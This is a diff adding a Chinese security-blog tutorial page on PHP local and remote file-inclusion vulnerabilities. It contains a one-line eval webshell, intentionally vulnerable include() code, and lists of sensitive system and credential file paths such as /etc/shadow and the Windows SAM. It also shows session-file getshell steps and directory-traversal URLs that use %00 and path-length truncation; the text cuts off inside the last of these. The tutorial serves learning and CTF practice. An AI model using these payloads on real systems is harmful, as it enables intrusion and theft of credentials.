@@ -1,0 +1,703 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="H0ne">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="一、什么是文件包含漏洞程序开发人员通常会把可重复使用的函数写到单个文件中，在使用某些函数时，直接调用此文件，无需，次编写，这种调用文件的过程一般被称为文件包含。一句话木马   文件包含漏洞的成因随着网站业务的需求，程序开发人员一般希望代码更灵活，所以将被包含的文件设置为变量，用来进行动态调用，但是正是这种灵活性通过动态变量的方式引入需要包含的文件时，用户对这个变量可控而且服务端又没有做合理的校验或">
+<meta property="og:type" content="article">
+<meta property="og:title" content="文件包含">
+<meta property="og:url" content="http://example.com/2023/04/20/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/index.html">
+<meta property="og:site_name" content="H0ne&#39;s Blog">
+<meta property="og:description" content="一、什么是文件包含漏洞程序开发人员通常会把可重复使用的函数写到单个文件中，在使用某些函数时，直接调用此文件，无需，次编写，这种调用文件的过程一般被称为文件包含。一句话木马   文件包含漏洞的成因随着网站业务的需求，程序开发人员一般希望代码更灵活，所以将被包含的文件设置为变量，用来进行动态调用，但是正是这种灵活性通过动态变量的方式引入需要包含的文件时，用户对这个变量可控而且服务端又没有做合理的校验或">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210428084807517.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMTQyMzY4,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210428081538118.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210428081625344.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMTQyMzY4,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210428082222800.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMTQyMzY4,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210428082914843.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMTQyMzY4,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210428085625413.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMTQyMzY4,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210428090021657.png">
+<meta property="article:published_time" content="2023-04-20T15:33:27.689Z">
+<meta property="article:modified_time" content="2023-04-20T15:14:25.022Z">
+<meta property="article:author" content="H0ne">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/20210428084807517.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMTQyMzY4,size_16,color_FFFFFF,t_70">
+  
+  
+  
+  <title>文件包含 - H0ne&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/fluid-extension.css">
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/shubiao.css">
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/scroll.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>H0ne&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="文件包含"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-04-20 23:33" pubdate>
+          2023年4月20日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          7.9k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          66 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">文件包含</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="一、什么是文件包含漏洞"><a href="#一、什么是文件包含漏洞" class="headerlink" title="一、什么是文件包含漏洞"></a>一、什么是文件包含漏洞</h2><p>程序开发人员通常会把可重复使用的函数写到单个文件中，在使用某些函数时，直接调用此文件，无需，次编写，这种调用文件的过程一般被称为文件包含。<br>一句话木马   <?php @eval($_POST['a']);?><br><font color=blue>文件包含漏洞的成因</font><br>随着网站业务的需求，程序开发人员一般希望代码更灵活，所以将被包含的文件设置为变量，用来进行动态调用，但是正是这种灵活性通过动态变量的方式引入需要包含的文件时，用户对这个变量可控而且服务端又没有做<br>合理的校验或者校验被绕过就造成了文件包含漏洞。</p>
+<p>几乎所有脚本语言都会提供文件包含的功能，但文件包含漏洞在PHP Web Application中居多,<br>而在JSP、ASP、<a target="_blank" rel="noopener" href="http://asp.net程序中却非常少,甚至没有.包含漏洞的存在.这与程序开发人员的水平无关,而问题在于语言设计的弊端./">http://ASP.NET程序中却非常少，甚至没有。包含漏洞的存在。这与程序开发人员的水平无关，而问题在于语言设计的弊端。</a><br><font color=blue>漏洞产生原因</font><br>文件包含函数加载的参数没有经过过滤或者严格的定义，可以被用户控制，包含其他恶意文件，导致了执行了非预期的代码。</p>
+<p>示例代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$filename</span>  = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>];<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$filename</span>);<br><span class="hljs-meta">?&gt;</span><br>例如：<br><br><span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>]参数开发者没有经过严格的过滤，直接带入了<span class="hljs-keyword">include</span>的函数，攻击者可以修改<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>]的值，执行非预期的操作。<br></code></pre></td></tr></table></figure>
+<p><font color =blue>PHP中常见包含文件的函数</font><br><font color =blue>Ø include( )</font><br>当使用该函数包含文件时，只有代码执行到 include()函数时才将文件包含<br>进来，发生错误时之给出一个警告，继续向下执行。<br><font color =blue>Ø include_once( )</font><br>功能与Include()相同，区别在于当重复调用同一文件时，程序只调用一次<br><font color =blue>Ø require( )</font><br>require()与include()的区别在于require()执行如果发生错误，函数会输出<br>错误信息，并终止脚本的运行。<br><font color =blue>Ø require_once( )</font><br>功能与require()相同，区别在于当重复调用同一文件时，程序只调用一次。</p>
+<h2 id="文件包含漏洞的分类"><a href="#文件包含漏洞的分类" class="headerlink" title="文件包含漏洞的分类"></a><font color =blue >文件包含漏洞的分类</font></h2><p><font color =blue > 本地文件包含漏洞：</font><br>当被包含的文件在服务器本地时，就形成的本地文件包含漏洞。<br><font color =blue >远程文件包含漏洞：</font><br>本地文件包含和远程文件包含造成漏洞的原因是一样的，当php.ini 中的配<br>置选项allow_url_fopen和allow_url_include为ON的话，则包含的文件可以是第三方服务器中的文件，这样就形成了远程文件包含漏洞。</p>
+<h2 id="二、文件包含漏洞的实践"><a href="#二、文件包含漏洞的实践" class="headerlink" title="二、文件包含漏洞的实践"></a>二、文件包含漏洞的实践</h2><h3 id="1、本地文件包含-Local-File-Include-LFI"><a href="#1、本地文件包含-Local-File-Include-LFI" class="headerlink" title="1、本地文件包含 Local File Include (LFI)"></a>1、本地文件包含 Local File Include (LFI)</font></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">1</span>.所包含文件内容符合PHP语法规范：任何扩展名都可以被PHP解析。<br><span class="hljs-number">2</span>.包含非PHP语法规范源文件，会暴露其源代码。<br></code></pre></td></tr></table></figure>
+<p>例如：<br>test1.php代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;abc&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>; <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p>test2.php代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;test1.php&quot;</span>);<br> <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p>执行test2.php，会输出 abc。</p>
+<p><font color=blue>如果test2.php包含的是一个 txt文件，并且这个txt文件内容符合php语法规则，则txt文件会被当成php文件执行。如果包含非php语法规则的内容，则会暴露其源代码。</font></p>
+<p><font color =red>常见的敏感信息路径：</font></p>
+<p><strong>Windows系统</strong></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs awk"><br>c:\boot.ini <span class="hljs-regexp">//</span> 查看系统版本<br><br>c:\windows\system32\inetsrv\MetaBase.xml <span class="hljs-regexp">//</span> IIS配置文件<br><br>c:\windows\repair\sam <span class="hljs-regexp">//</span> 存储Windows系统初次安装的密码<br><br>c:\ProgramFiles\mysql\my.ini <span class="hljs-regexp">//</span> MySQL配置<br><br>c:\ProgramFiles\mysql\data\mysql\user.MYD <span class="hljs-regexp">//</span> MySQL root密码<br><br>c:\windows\php.ini <span class="hljs-regexp">//</span> php 配置信息<br></code></pre></td></tr></table></figure>
+
+<p><strong>Linux&#x2F;Unix系统</strong></p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs stata">/etc/passwd <span class="hljs-comment">// 账户信息</span><br><br>/etc/shadow <span class="hljs-comment">// 账户密码文件</span><br><br>/usr/<span class="hljs-keyword">local</span>/<span class="hljs-keyword">app</span>/apache2/<span class="hljs-keyword">conf</span>/httpd.<span class="hljs-keyword">conf</span> <span class="hljs-comment">// Apache2默认配置文件</span><br><br>/usr/<span class="hljs-keyword">local</span>/<span class="hljs-keyword">app</span>/apache2/<span class="hljs-keyword">conf</span>/extra/httpd-vhost.<span class="hljs-keyword">conf</span> <span class="hljs-comment">// 虚拟网站配置</span><br><br>/usr/<span class="hljs-keyword">local</span>/<span class="hljs-keyword">app</span>/php5/lib/php.ini <span class="hljs-comment">// PHP相关配置</span><br><br>/etc/httpd/<span class="hljs-keyword">conf</span>/httpd.<span class="hljs-keyword">conf</span> <span class="hljs-comment">// Apache配置文件</span><br><br>/etc/my.<span class="hljs-keyword">conf</span> <span class="hljs-comment">// mysql 配置文件</span><br><br>/<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/nginx/access.<span class="hljs-keyword">log</span> 查看相应日志文件，文件日志默认地址<br><br>（可通过抓包查看得知服务器为Ubuntu，由nginx搭建的网站，nginx的日志文件默认地址在/<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/nginx/access.<span class="hljs-keyword">log</span>和/<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/nginx/<span class="hljs-keyword">error</span>.<span class="hljs-keyword">log</span>，其中本题中access.<span class="hljs-keyword">log</span>可以打开）<br></code></pre></td></tr></table></figure>
+<p><strong>1.无限制本地文件包含漏洞</strong><br>测试代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$filename</span>  = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>];<br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$filename</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>测试结果：<br>通过目录遍历漏洞可以获取到系统中其他文件的内容。</p>
+<p><img src="https://img-blog.csdnimg.cn/20210428084807517.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMTQyMzY4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p><font color=blue>session文件包含漏洞</font><br>条件：<br>session的存储位置可以获取。<br>1、通过phpinfo的信息可以获取到session的存储位置。<br>通过phpinfo的信息，<br>获取到session.save_path为&#x2F;var&#x2F;lib&#x2F;php&#x2F;sessions：<br><img src="https://img-blog.csdnimg.cn/20210428081538118.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>2. 通过猜测默认的session存放位置进行尝试。<br>如linux下默认存储在&#x2F;var&#x2F;lib&#x2F;php&#x2F;session目录下<img src="https://img-blog.csdnimg.cn/20210428081625344.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMTQyMzY4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>session中的内容可以被控制，传入恶意代码。<br>示例：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">session_start</span>();<br><br><span class="hljs-variable">$ctfs</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ctfs&#x27;</span>];<br><br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;username&quot;</span>]=<span class="hljs-variable">$ctfs</span>;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p>漏洞分析</p>
+<p>此php会将获取到的GET型ctfs变量的值存入到session中。</p>
+<p>当访问<a target="_blank" rel="noopener" href="http://www.ctfs-wiki/session.php?ctfs=ctfs">http://www.ctfs-wiki/session.php?ctfs=ctfs</a> 后，会在&#x2F;var&#x2F;lib&#x2F;php&#x2F;session目录下存储session的值。</p>
+<p>session的文件名为sess_+sessionid，sessionid可以通过开发者模式获取。<br><img src="https://img-blog.csdnimg.cn/20210428082222800.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMTQyMzY4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>所以session的文件名为sess_akp79gfiedh13ho11i6f3sm6s6。</p>
+<p>到服务器的&#x2F;var&#x2F;lib&#x2F;php&#x2F;session目录下查看果然存在此文件，内容为：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">username|s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;ctfs&quot;</span>;<br>[root@c21336db44d2 session]<span class="hljs-comment"># cat sess_akp79gfiedh13ho11i6f3sm6s6</span><br>username|s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;ctfs&quot;</span><br></code></pre></td></tr></table></figure>
+<p><font color=blue>漏洞利用</font><br>如果存在本地文件包含漏洞，就可以通过ctfs写入恶意代码到session文件中，然后通过文件包含漏洞执行此恶意代码getshell。</p>
+<p>当访问<a target="_blank" rel="noopener" href="http://www.ctfs-wiki/session.php?ctfs=">http://www.ctfs-wiki/session.php?ctfs=</a><?php phpinfo();?>后，会在&#x2F;var&#x2F;lib&#x2F;php&#x2F;session目录下存储session的值。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">[root@<span class="hljs-number">6</span>da845537b27 session]<span class="hljs-comment"># cat sess_83317220159fc31cd7023422f64bea1a</span><br>username|s:<span class="hljs-number">18</span>:<span class="hljs-string">&quot;&lt;?php phpinfo();?&gt;&quot;</span>;<br></code></pre></td></tr></table></figure>
+<p>攻击者通过phpinfo()信息泄露或者猜测能获取到session存放的位置，文件名称通过开发者模式可获取到，然后通过文件包含的漏洞解析恶意代码getshell。<br><img src="https://img-blog.csdnimg.cn/20210428082914843.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMTQyMzY4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p><strong>有限制本地文件包含漏洞绕过：</strong><br>测试代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$filename</span>  = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>];<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$filename</span> . <span class="hljs-string">&quot;.html&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p><font color =blue>%00截断</font><br>条件：magic_quotes_gpc &#x3D; Off php版本&lt;5.3.4</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>www.ctfs-wiki.com<span class="hljs-regexp">/FI/</span>FI.php?filename=..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>../boot.ini%<span class="hljs-number">00</span><br></code></pre></td></tr></table></figure>
+<p><font color =blue>路径长度截断</font><br>条件：windows OS，点号需要长于256；linux OS 长于4096</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Windows</span>下目录最大长度为<span class="hljs-number">256</span>字节，超出的部分会被丢弃；<br><span class="hljs-attribute">Linux</span>下目录最大长度为<span class="hljs-number">4096</span>字节，超出的部分会被丢弃。<br></code></pre></td></tr></table></figure>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>www.ctfs-wiki.com<span class="hljs-regexp">/FI/</span>FI.php?filename=test.txt<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span 